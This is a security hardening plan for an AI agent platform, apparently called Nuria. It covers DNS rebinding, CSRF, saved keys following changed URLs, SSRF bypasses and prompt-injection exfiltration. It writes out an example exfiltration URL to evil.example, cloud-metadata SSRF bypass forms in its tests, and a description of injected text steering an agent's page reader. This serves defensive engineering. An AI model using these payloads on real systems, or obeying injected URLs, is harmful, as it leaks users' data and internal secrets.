# Phase H3 plan — An API only you can drive

**Goal:** only you, through Nuria's own pages, can drive Nuria. A web page you visit can't
reach it, a saved key can't be sent somewhere new, an agent can't be talked into sending
your data to an address you never saw, and no outbound request reaches cloud metadata or
Nuria's own services.

**Why:** the platform review of 2026-11-08, security findings:

| # | Finding | Severity |
| --- | --- | --- |
| 9 | **The API has no identity.** nginx has `server_name _`, and nothing checks `Host` or `Origin`. A page that rebinds its DNS to 127.0.0.1 can read chats, approve tools and add MCP servers; a plain cross-site form POST can cancel every run. | High |
| 10 | **The cloud Helm example puts all of that on the internet:** a public host with TLS and no login, and the admin routes reachable at `/api/admin`. | Critical |
| 11 | **Saved keys follow a changed URL.** Change a connection's `base_url` (or an MCP server's URL or header), then Test: the sealed key goes to the new address. | High |
| 12 | **`read_webpage` sends data out without asking.** It is `read`-classed and the allow-list is empty, so injected text can make it fetch `https://evil.example/?d=<your chat>`. | High |
| 13 | **MCP, model and SearXNG URLs skip the SSRF guard.** No DNS resolution: decimal IPs, `*.nip.io` names and the stack's container names reach cloud metadata and Nuria's own services. | Medium |

**Requirements:** R14.12 (secrets), R14.15 (untrusted content), SECURITY.md's scope
("makes an agent … send data without your approval"), CR-006 R18 (connections).

---

## 1. Research (2026-11-09)

- **DNS rebinding** defeats the same-origin policy because the browser still believes it
  talks to `evil.example`. The standard defence is to **check `Host`**: a rebinding page's
  requests carry *its* host name, never `localhost`. This is how Jupyter (`allow_remote_access`
  / `local_hostnames`) and Ollama's `OLLAMA_ORIGINS` / host checks protect local servers.
- **CSRF without tokens.** The modern defence is the **Fetch Metadata resource isolation
  policy** (OWASP, web.dev). Browsers send `Sec-Fetch-Site`
  (`same-origin`, `same-site`, `cross-site`, `none`); a server refuses `cross-site` and
  `same-site` requests to its API, with `Origin` checked as the fallback for older browsers.
  Non-browser clients (the CLI, scripts, tests) send neither and are unaffected.
- **Keys bound to their destination:** a key must never move to a new host without
  being entered again. That's simpler than binding the origin into the encryption context
  (AAD), and just as strict.
- **SSRF:** resolve the host and check every address (IPv4, IPv6, IPv4-mapped), deny
  link-local and metadata ranges, and deny the addresses of Nuria's own services
  (resolved, not matched by name). `web/fetch.py`'s `GuardedBackend` already does this
  for the page reader.

## 2. Design

### 2.1 Only Nuria's own pages reach the API (finding 9)

- **nginx:** requests whose `Host` isn't in `UI_ALLOWED_HOSTS` get **421 Misdirected
  Request**. The default is `localhost`, `127.0.0.1` and `[::1]`, plus the port; Kubernetes
  adds the ingress host, and the browser tests add `ui`.
- **FastAPI**, defence in depth (and `make api` in development): a Fetch Metadata check.
  - `Sec-Fetch-Site: cross-site` or `same-site` → **403**.
  - Without it, an `Origin` whose host isn't allowed → **403**.
  - Requests with neither header (the CLI, scripts, tests) pass.
  - A trusted-host check in the API too, which also accepts the stack's internal names
    (`api`, Prometheus's scrape).
- No login yet. A local process can still use the API, as with any local tool, and
  `SECURITY.md` says so. Accounts come with tenancy.

### 2.2 The cloud example can't be exposed without a login (finding 10)

- The chart **refuses to render** when `ingress.host` is set and neither
  `ingress.basicAuthSecret` (nginx-ingress basic auth, in front of everything) nor
  `ingress.unauthenticated: true` (an explicit, documented choice) is set.
- `ADMIN_API_ENABLED` defaults to `false` in the chart. The kill switch keeps working,
  because it uses the agents API, not `/admin`.
- `values-cloud.example.yaml` shows basic auth, and the Kubernetes guide says how to
  create its Secret.

### 2.3 Keys stay with their address (finding 11)

- **Model connections:** changing `base_url` to a different host (scheme, host or port)
  without sending the key again → **422** "Enter the key again for the new address". With a
  new key it's fine.
- **MCP servers:** the same for `url` and `header_name`.
- Both are audited as before.

### 2.4 One outbound guard for every client (finding 13)

- One function, `net.check_destination(url, purpose)` (new `net.py`):
  1. resolve the host;
  2. deny link-local, multicast, unspecified and reserved addresses, cloud metadata
     (`169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`) and NAT64 forms of them;
  3. deny any address that **Nuria's own services** resolve to (`api`, `worker`,
     `postgres`, `redis`, `sandboxd`, `fetcher`, … resolved at check time);
  4. allow loopback and private ranges only where the purpose allows it (a model or an
     MCP server on your machine: yes);
  5. refuse redirects, as now.
- It's used by MCP (add, test, every call), model connections (add, test, list models)
  and the SearXNG address.
- Decimal, hex and octal IPs are normalised by the resolver and then checked, so they
  can't slip through.

### 2.5 Reading a page you never saw asks first (finding 12)

**Pattern: a decorator around the run's `ToolPolicy` (provenance policy).**

- `read_webpage` is allowed without asking **only for a URL that came from you or from a
  search result**:
  - the URL is in the turn's message or an earlier user message in the chat; or
  - its exact URL appeared in a `web_search` result in this run (from the ledger).
- Any other URL **asks you first**, and the approval card shows the full URL.
- The `web_allowlist`, when set, still applies first; a site on it is allowed.
- Approvals are bound (H1), so an injected URL can't ride on an earlier approval.

## 3. Proof (tests)

- **Host and CSRF** (integration):
  - `Host: evil.example` → 421 from nginx (container test) and 403 from the API;
  - `Sec-Fetch-Site: cross-site` on `POST /admin/cancel-all` → 403, and nothing is
    cancelled;
  - same-origin → OK;
  - no headers (the CLI) → OK.
- **Chart:** rendering the cloud values without auth fails, with the message; with
  `basicAuthSecret` it renders the annotation; `ADMIN_API_ENABLED=false`.
- **Keys:** a changed host without a key → 422, and the stored key isn't used; with a key
  → OK. The same for MCP.
- **SSRF:** every form from the review is refused for MCP, models and SearXNG:
  - `http://2852039166/`, `0xa9fea9fe`, `0251.0376.0251.0376`;
  - `169.254.169.254.nip.io` (resolved);
  - `metadata.google.internal.`;
  - the stack's service names and IPs;
  - `fd00:ec2::254`, `100.100.100.200`.

  Loopback and private addresses are still allowed for a local model or MCP server.
- **Egress:**
  - a planted URL in a page → `read_webpage` asks;
  - a URL from the user or from a search result → no question;
  - the card shows the full URL.

  An injection eval case is added for exfiltration by URL.
- **E2e, browser and Kubernetes:** the suites. The browser config adds `ui` to the
  allowed hosts, as CI does.

## 4. Out of scope

- Accounts, sessions and tenancy.
- Redis auth and network segmentation (in "Make it solid").
- Pinning the connected IP for the OpenAI and MCP SDK clients (a remaining
  time-of-check-to-time-of-use window, noted in SECURITY.md).
